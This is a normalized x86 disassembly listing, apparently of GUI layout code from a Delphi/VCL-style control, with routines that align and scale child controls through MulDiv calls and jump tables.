mov [ eax + 0x18c ] edx
sub_3ab29bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aae594
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_3ab29f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_3ab2b0a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_3aae9e8
push ebx
push sub_3ab4904
call sub_3a84724
mov [ ebx + 0x1c0 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89978
mov esi eax
mov [ ebx + 0x1a4 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_3a89b20
mov [ ebx + 0x1dd ] 0x1
mov [ ebx + 0x1d4 ] 0xffffffff
mov [ ebx + 0x1b8 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accd94
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x1bc ]
call sub_3a652f4
lea eax [ ebx + 0x1bc ]
call sub_3a652a0
jmp r-xdata
mov [ ebx + 0x1db ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x192 ] al
mov [ ebx + 0x193 ] 0x2
mov [ ebx + 0x194 ] 0x1
mov [ ebx + 0x198 ] 0x1
mov [ ebx + 0x158 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3abd670
mov esi eax
mov [ ebx + 0x1a0 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_3ab910c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab2b11
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3ab2b11
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ab2b34
push ebx
push esi
push edi
push ebp
call sub_3a6478c
mov ebx edx
mov ebp eax
mov eax ebp
call sub_3a83918
cmp [ ebp + 0x1dc ] 0x0
je r-xdata
lea eax [ ebp + 0x1b0 ]
call sub_3a66cb4
mov eax [ ebp + 0x1ac ]
call sub_3a64380
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov [ ebp + 0x1dc ] 0x0
xor edx edx
mov eax ebp
call sub_3aad48c
cmp [ ebp + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebp
call sub_3ab3920
mov eax ebp
call sub_3ab3ba4
mov esi eax
test esi esi
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ ebp + 0x1a4 ]
call sub_3a64380
mov eax [ ebp + 0x1c0 ]
test eax eax
je r-xdata
mov edx esi
dec edx
mov eax ebp
call sub_3ab3b68
mov edi eax
mov edx edi
mov eax ebp
call sub_3ab398c
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax ebp
call sub_3ab3ba4
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0x1a0 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_3aaeae0
test bl bl
jle r-xdata
call sub_3a847bc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
sub_3ab2c14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d0 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_3ab2cd8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3a7a68c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_3ab7e94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_3a7a494
mov edx [ eax + 0x1d4 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_3a7a5e0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_3a7a494
test eax eax
je r-xdata
sub_3ab2ce8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor eax eax
push ebp
push sub_3ab2d28
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aaee18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab2d2f
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
sub_3ab2d2f
mov eax [ ebp - 0x4 ]
call sub_3ab2c14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab472c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
sub_3ab2d60
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x8 ]
add [ edx ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0xc ]
add [ edx + 0x4 ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x10 ]
sub [ edx + 0x8 ] ecx
mov eax [ eax + 0x1a0 ]
mov eax [ eax + 0x14 ]
sub [ edx + 0xc ] eax
retn
sub_3ab2d90
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x175 ] 0x0
je r-xdata
movzx eax [ ebp + 0x14 ]
movzx eax [ eax + rw-data ]
cmp al [ esi + 0x61 ]
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x179 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
test [ esi + 0x61 ] 0x4
je r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp + 0x14 ]
add al 0xfd
sub al 0x2
jb r-xdata
test [ esi + 0x61 ] 0x1
jne r-xdata
test [ esi + 0x61 ] 0x1
je r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
movzx eax [ ebp + 0x14 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
test [ esi + 0x61 ] 0x8
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x165 ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_3abd788
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
jmp [ eax * 4 + jump_table_3ab2ff3 ]
sub al 0x3
jne r-xdata
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
test [ esi + 0x61 ] 0x2
jne r-xdata
test [ esi + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
movzx eax [ ebp + 0x14 ]
cmp eax 0x5
ja r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0x14 ]
add [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub [ edi + 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xac ]
mov eax [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] eax
movzx eax [ ebp + 0x14 ]
cmp eax 0x6
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x169 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_3ab30bb ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_3abd788
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
sub [ edi + 0x4 ] edx
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
sub [ edi ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x16d ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x171 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
sub_3ab3170
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov ecx esi
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_3a78df4
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab31d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
movzx edx [ ebp - 0x5 ]
cmp edx 0x6
ja r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
jmp [ edx * 4 + jump_table_3ab31f6 ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xa8 ]
sub_3ab3300
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov esi eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x30 ]
call sub_3ab3170
lea ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_3ab2d90
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab3348
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ab3ba4
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_3a7a33c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_3a7a494
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_3ab3300
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_3ab3b68
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
xor esi esi
jmp r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_3a7a510
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_3a7a494
mov edx eax
mov ecx ebx
mov eax edi
call sub_3ab31d0
pop ecx
test al al
je r-xdata
inc esi
sub_3ab34d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_3ab3ba4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_3ab3b68
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_3ab3b68
movzx edx [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_3ab3528
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
push ebp
call sub_3ab34d4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ab3607
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_3ab3348
pop ecx
push ebp
mov al 0x2
call sub_3ab3348
pop ecx
push ebp
mov al 0x3
call sub_3ab3348
pop ecx
push ebp
mov al 0x4
call sub_3ab3348
pop ecx
push ebp
mov al 0x5
call sub_3ab3348
pop ecx
push ebp
mov al 0x6
call sub_3ab3348
pop ecx
push ebp
xor eax eax
call sub_3ab3348
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc6
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_3ab362c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x190 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor eax eax
push ebp
push sub_3ab36b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_3ab36f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ab37b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aaf4fc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab37bc
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edx eax
mov eax [ ebp - 0xc ]
call sub_3a7a33c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_3aaf210
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_3a7a494
xor ecx ecx
mov edx 0xb03e
call sub_3ab0e78
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_3ab37c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor edx edx
push ebp
push sub_3ab38b2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffbf
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x8 ]
test esi esi
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edx eax
mov eax [ ebp - 0xc ]
call sub_3a7a33c
mov edx esi
dec edx
mov eax [ ebp - 0xc ]
call sub_3a7a494
mov ebx eax
cmp [ ebx + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax ebx
call sub_3aaef04
mov dl 0x4
mov eax ebx
call sub_3aaef04
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_3a7a388
sub_3ab3920
push ebx
push esi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
call sub_3ac463c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_3ac9674
sub_3ab3940
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_3aae144
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_3aae144
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_3aae144
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_3ab398c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_3aae16c
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_3aae16c
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_3aae16c
jmp r-xdata
xor eax eax
